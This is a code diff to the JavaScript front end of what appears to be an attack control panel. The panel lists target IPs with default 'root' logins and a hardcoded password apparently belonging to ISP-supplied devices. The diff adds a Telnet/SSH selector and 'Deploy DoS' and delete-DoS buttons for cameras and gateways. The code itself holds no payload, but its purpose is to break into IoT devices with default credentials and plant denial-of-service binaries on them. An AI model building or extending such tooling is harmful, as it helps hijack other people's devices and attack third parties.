@@ -72,6 +72,7 @@ export function renderIndividualCreds(ips) {
     div.className = 'ind-cred-row';
     div.innerHTML = `
       <span class="ip-label">${escapeHtml(ip)}</span>
+      <select class="inp sm ind-proto" data-ip="${escapeHtml(ip)}"><option value="auto">Auto</option><option value="telnet">Telnet</option><option value="ssh">SSH</option></select>
       <input class="inp sm mono ind-user" data-ip="${escapeHtml(ip)}" placeholder="root" value="root">
       <input class="inp sm mono ind-pass" data-ip="${escapeHtml(ip)}" placeholder="password" type="password" value="vnpt@123">`;
     wrap.appendChild(div);
@@ -82,9 +83,10 @@ export function getIndividualCreds() {
   const creds = [];
   $$('.ind-cred-row').forEach(row => {
     const ip = row.querySelector('.ind-user')?.dataset.ip;
+    const proto = row.querySelector('.ind-proto')?.value || 'auto';
     const user = row.querySelector('.ind-user')?.value || 'root';
     const pass = row.querySelector('.ind-pass')?.value || '';
-    if (ip) creds.push({ ip, username: user, password: pass });
+    if (ip) creds.push({ ip, username: user, password: pass, protocol: proto });
   });
   return creds;
 }
@@ -104,16 +106,32 @@ export function renderBinaryStatus(results, cameraStatus) {
     const bin = checkMap[ip];
     const tr = document.createElement('tr');
     const online = cam?.connected ? '<span class="st-online">Online</span>' : '<span class="st-offline">Offline</span>';
-    let dosStatus = '<span class="st-missing">—</span>';
+    const proto = bin?.protocol || cam?.protocol || 'telnet';
+    const isGW = proto === 'ssh';
+    const typeLabel = isGW ? '<span class="chip-gw">GW</span>' : '<span class="chip-cam">CAM</span>';
+    let dosCol = '<span class="st-na">—</span>';
+    let gwCol = '<span class="st-na">—</span>';
     let toolsStatus = '<span class="st-missing">—</span>';
     let actions = '';
     if (bin) {
-      if (bin.exists) {
-        dosStatus = `<span class="st-exists">✓ ${escapeHtml(bin.size || '?')}B</span>`;
-        actions += `<button class="btn btn-crit btn-sm del-bin" data-ip="${escapeHtml(ip)}">Xóa DoS</button> `;
+      if (isGW) {
+        dosCol = '<span class="st-na">—</span>';
+        if (bin.gw_exists) {
+          gwCol = `<span class="st-exists">✓ ${escapeHtml(bin.gw_size || '?')}B</span>`;
+          actions += `<button class="btn btn-crit btn-sm del-gw" data-ip="${escapeHtml(ip)}">Xóa DoS</button> `;
+        } else {
+          gwCol = '<span class="st-missing">✗</span>';
+          actions += `<button class="btn btn-accent btn-sm deploy-gw" data-ip="${escapeHtml(ip)}">Deploy DoS</button> `;
+        }
       } else {
-        dosStatus = '<span class="st-missing">✗</span>';
-        actions += `<button class="btn btn-accent btn-sm deploy-bin" data-ip="${escapeHtml(ip)}">Deploy DoS</button> `;
+        gwCol = '<span class="st-na">—</span>';
+        if (bin.exists) {
+          dosCol = `<span class="st-exists">✓ ${escapeHtml(bin.size || '?')}B</span>`;
+          actions += `<button class="btn btn-crit btn-sm del-bin" data-ip="${escapeHtml(ip)}">Xóa DoS</button> `;
+        } else {
+          dosCol = '<span class="st-missing">✗</span>';
+          actions += `<button class="btn btn-accent btn-sm deploy-bin" data-ip="${escapeHtml(ip)}">Deploy DoS</button> `;
+        }
       }
       if (bin.tools_exists) {
         toolsStatus = bin.tools_size
@@ -126,9 +144,10 @@ export function renderBinaryStatus(results, cameraStatus) {
       }
     }
     tr.innerHTML = `
-      <td class="ip-cell">${escapeHtml(ip)}</td>
+      <td class="ip-cell">${escapeHtml(ip)} ${typeLabel}</td>
       <td>${online}</td>
-      <td>${dosStatus}</td>
+      <td>${dosCol}</td>
+      <td>${gwCol}</td>
       <td>${toolsStatus}</td>
       <td>${actions}</td>`;
     tbody.appendChild(tr);
